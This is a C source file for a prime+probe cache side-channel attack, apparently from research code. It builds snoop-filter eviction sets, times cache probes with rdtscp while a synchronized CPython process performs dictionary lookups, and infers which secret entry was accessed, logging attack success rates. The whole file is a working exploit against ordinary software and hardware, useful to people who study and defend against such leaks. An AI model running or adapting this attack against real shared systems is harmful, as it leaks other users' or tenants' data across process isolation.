#include <stdbool.h>

#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "Python.h"
#include "shared_memory.h"
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static const char *dump_dir = "cpython_dict_profiling";
static const uint64_t max_exec_cycles = (uint64_t)2e6;
enum { cache_line_count = 1, profile_samples = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static const int dict_entries = 1 << 16;
static const int target_entries = 4;
static const int dict_iterations = 64;
static const float factor = 0.75;

static const int attack_iterations = 100;

u32 *profiles = NULL;
f64 *expected_hits = NULL;
static config_t *cfg;
static int *select_all_mask, *select_all, select_all_num = 0;
static bool use_cos = true;

static bool check(u32 ctr) {
    return (ctr >= dict_iterations * factor) &&
           (ctr <= dict_iterations / factor);
}

static u32
cpython_PS_profile_once(EVSet *evset, int slot, uint64_t max_exec_cycles) {
    uint64_t tsc0, tsc1;
    uint8_t *scope = evset->addrs[0];
    evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);

    u64 scope_lat, end;
    u32 aux, index = 0;
    u32 l2_repeat = 1, array_repeat = 12;
    i64 threshold = detected_cache_lats.l2_thresh;

    prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);

    tsc0 = tsc1 = rdtscp();
    do {
        tsc1 = rdtscp();

        scope_lat = _time_maccess_aux(scope, end, aux);
        if (scope_lat > threshold) {
            if (scope_lat < detected_cache_lats.interrupt_thresh) {
                probe_time[0][index] = scope_lat;
                sample_tsc[0][index] = tsc1;
                index++;
            }
            prime_skx_sf_evset_ps_flush(
                evset, sf_chain, array_repeat, l2_repeat);
        }
    } while (tsc1 - tsc0 < max_exec_cycles && index < profile_samples);

    tsc1 = mfence_rdtscp();

    log_trace("Client start done");
    return index;
}

static void profile(int i, int j) {
    for (int l3_set = 0; l3_set < cfg->l3.sets; ++l3_set) {
        if (l3_set % 1000 == 0) {
            log_info("profile set %d: L3 set: %d", j, l3_set);
        }
        EVSet *evset = get_sf_kth_evset(l3_set);
        if (evset) {
            memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
            memset(probe_time_arr, 0, sizeof(probe_time_arr));

            sync_ctx_set_action(SYNC_CTX_PROBE);
            *sync_ctx.data = i;

            pthread_barrier_wait(sync_ctx.barrier);

            u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);

            pthread_barrier_wait(sync_ctx.barrier);

            if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
                log_warn("profile time/iteration too small (index %lu)", res);
            }

            profiles[j * cfg->l3.sets + l3_set] = res;
        } else {
            log_error("Cannot get evset for set %d", l3_set);
        }
    }
}

static void profile_selected(int i, int j, int *sel, int sel_num) {
    for (int idx = 0; idx < sel_num; ++idx) {
        int l3_set = sel[idx];
        EVSet *evset = get_sf_kth_evset(l3_set);
        if (evset) {
            memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
            memset(probe_time_arr, 0, sizeof(probe_time_arr));

            sync_ctx_set_action(SYNC_CTX_PROBE);
            *sync_ctx.data = i;

            pthread_barrier_wait(sync_ctx.barrier);

            u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);

            pthread_barrier_wait(sync_ctx.barrier);

            if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
                log_warn("profile time/iteration too small (index %lu)", res);
            }

            profiles[j * cfg->l3.sets + l3_set] = res;
        } else {
            log_error("Cannot get evset for set %d", l3_set);
        }
    }
}

static double
selected_cos_similarity(int test_id, int exam_id, int *sel, int sel_num) {
    double dot = 0.0;
    double nx = 0.0;
    double ny = 0.0;

    for (size_t i = 0; i < sel_num; i++) {
        int slot0 = test_id * cfg->l3.sets + sel[i];
        int slot1 = exam_id * cfg->l3.sets + sel[i];
        double xi = (double)profiles[slot0];
        double yi = (double)expected_hits[slot1];
        dot += xi * yi;
        nx += xi * xi;
        ny += yi * yi;
    }

    double denom = sqrt(nx) * sqrt(ny);
    if (denom == 0.0)
        return 0.0;

    return dot / denom;
}

static int infer_unique(int j) {
    u32 unique[target_entries];
    u32 matching[target_entries];
    memset(unique, 0, target_entries * sizeof(u32));
    memset(matching, 0, target_entries * sizeof(u32));

    for (int l3 = 0; l3 < cfg->l3.sets; ++l3) {
        u32 ctr = profiles[j * cfg->l3.sets + l3];
        bool c = check(ctr);

        for (int i = 0; i < target_entries; ++i) {
            u32 tctr = profiles[i * cfg->l3.sets + l3];
            bool t = check(tctr);

            if (c != t) {
                unique[i]++;
            }

            if (c && t) {
                matching[i]++;
            }
        }
    }

    int index = -1;
    double unique_sum = 0;

    for (int i = 0; i < target_entries; ++i) {
        log_info("%d: unique[%d] = %u", j, i, unique[i]);
        log_info("%d: matching[%d] = %u", j, i, matching[i]);
        unique_sum += unique[i];
        if (index != -1) {
            if (unique[i] < unique[index]) {
                index = i;
            }
        } else {
            index = i;
        }
    }

    double threshold = (unique_sum / target_entries) * 0.75;

    log_info("Threshold: %lf", threshold);

    if (unique[index] <= threshold) {
        return index;
    }

    return -1;
}

static int infer_cos(int test_id) {
    static double cos_sim_thres = 0.995;
    double best_sim = 0;
    int choice = -1;
    for (int exam_id = 0; exam_id < target_entries; ++exam_id) {
        double sim_i = selected_cos_similarity(
            test_id, exam_id, select_all, select_all_num);
        if (sim_i > best_sim) {
            best_sim = sim_i;
            choice = exam_id;
        }
        /* log_info("Sim(%d, %d)=%lf", test_id, exam_id, sim_i); */
    }
    log_info("Best sim %lf, choice %d", best_sim, choice);
    if (best_sim > cos_sim_thres) {
        return choice;
    }
    return -1;
}

static int infer(int j) {
    if (use_cos) {
        return infer_cos(j);
    } else {
        return infer_unique(j);
    }
}

int main(int argc, char *argv[]) {
    cfg = get_config();

    if (cache_env_init(1)) {
        log_error("Failed to initialize cache env!");
        return 0;
    }

    u32 l3_sets = cfg->l3.sets;
    u32 profile_size = l3_sets * (target_entries + 2);
    profiles = malloc(profile_size * sizeof(u32));
    memset(profiles, 0, profile_size * sizeof(u32));
    expected_hits = calloc(profile_size, sizeof(f64));

    helper_thread_ctrl hctrl;

    if (LLCF_multi_evset(0, &hctrl)) {
        log_error("Failed to build evset");
        return 0;
    }

    log_info("l2 thres %d, interrupt thres %d",
             detected_cache_lats.l2_thresh,
             detected_cache_lats.interrupt_thresh);

    if (start_helper_thread(&hctrl)) {
        log_error("Failed to start helper!\n");
        return 0;
    }

    for (int i = 0; i < cache_line_count; ++i) {
        sample_tsc[i] = sample_tsc_arr[i];
        probe_time[i] = probe_time_arr[i];
    }

    init_sync_ctx(CPYTHON_PROJ_ID);

    log_info("CPython loop barrier wait");
    pthread_barrier_wait(sync_ctx.barrier);

    int targets[target_entries];
    for (int i = 0; i < target_entries; ++i) {
        int target = 0;
        bool found = false;
        do {
            target = rand() % dict_entries;
            found = false;
            for (int j = 0; j < i; ++j) {
                if (target == targets[j]) {
                    found = true;
                    break;
                }
            }
        } while (found);
        targets[i] = target;
    }

    if (use_cos) {
        select_all_mask = calloc(cfg->l3.sets, sizeof(int));
        select_all = calloc(cfg->l3.sets, sizeof(int));
        select_all_num = 0;
    }
    // Profiling
    for (int i = 0; i < target_entries; ++i) {
        profile(targets[i], i);
        profile(targets[i], target_entries);
        int *cand = calloc(cfg->l3.sets, sizeof(int));
        int cand_num = 0;
        printf("%d: [", i);
        for (int j = 0; j < cfg->l3.sets; ++j) {
            u32 ctr0 = profiles[i * cfg->l3.sets + j];
            u32 ctr1 = profiles[target_entries * cfg->l3.sets + j];
            if (check(ctr0) || check(ctr1)) {
                printf(", %5d", j);
                cand[cand_num++] = j;
            }
        }
        printf("]\n");
        if (use_cos) {
            int *match_cnt = calloc(cand_num, sizeof(int));
            int validation_cnt = 10, validation_thres = 8;
            for (int k = 0; k < validation_cnt; k++) {
                profile_selected(targets[i], target_entries, cand, cand_num);
                for (int j = 0; j < cand_num; ++j) {
                    u32 cnt = profiles[target_entries * cfg->l3.sets + cand[j]];
                    match_cnt[j] += check(cnt);
                }
            }
            for (int j = 0; j < cand_num; ++j) {
                if (match_cnt[j] >= validation_thres) {
                    select_all_mask[cand[j]] = 1;
                }
            }

            free(match_cnt);
            free(cand);
        }
    }
    if (use_cos) {
        for (int i = 0; i < cfg->l3.sets; ++i) {
            if (select_all_mask[i]) {
                select_all[select_all_num++] = i;
            }
        }
        free(select_all_mask);

        for (int k = 0, cali_num = 10; k < cali_num; ++k) {
            for (int i = 0; i < target_entries; ++i) {
                profile_selected(targets[i], i, select_all, select_all_num);
                for (int j = 0; j < select_all_num; ++j) {
                    int slot = i * cfg->l3.sets + select_all[j];
                    expected_hits[slot] += profiles[slot] / 10.;
                }
            }
        }
        for (int i = 0; i < target_entries; ++i) {
            double sim =
                selected_cos_similarity(i, i, select_all, select_all_num);
            log_info("Cos_sim(i, i)=%lf", sim);
        }
    }

    srand(time(NULL));

    int target_success = 0;
    int target_access = 0;
    int access_success = 0;

    for (int i = 0; i < attack_iterations; ++i) {
        log_info("attack iteration: %d", i);

        // Hit
        int h = rand() % target_entries;
        if (use_cos) {
            profile_selected(
                targets[h], target_entries, select_all, select_all_num);
        } else {
            profile(targets[h], target_entries);
        }

        // Miss
        int nh = 0;
        bool found = false;
        do {
            nh = rand() % dict_entries;
            found = false;
            for (int j = 0; j < target_entries; ++j) {
                if (nh == targets[j]) {
                    found = true;
                    break;
                }
            }
        } while (found);
        if (use_cos) {
            profile_selected(
                nh, target_entries + 1, select_all, select_all_num);
        } else {
            profile(nh, target_entries + 1);
        }

        log_info("Hit at target index %d (%d)", targets[h], h);
        int hi = infer(target_entries);
        if (hi != -1) {
            target_access++;
        }
        if (hi == h) {
            target_success++;
            log_info("Correctly identfied target %d", h);
        } else {
            log_info("Incorrectly identfied target %d", hi);
        }

        log_info("Hit at non-target index %d", nh);
        int ni = infer(target_entries + 1);
        if (ni == -1) {
            access_success++;
            log_info("Correctly identfied access");
        } else {
            log_info("Incorrectly identfied access %d", ni);
        }
    }

    log_info("Target success rate: %f",
             (float)target_success / attack_iterations);
    log_info("Target access success rate: %f",
             (float)target_access / attack_iterations);
    log_info("Access success rate: %f",
             (float)access_success / attack_iterations);

    sync_ctx_set_action(SYNC_CTX_EXIT);
    pthread_barrier_wait(sync_ctx.barrier);

    free(profiles);

    return 0;
}
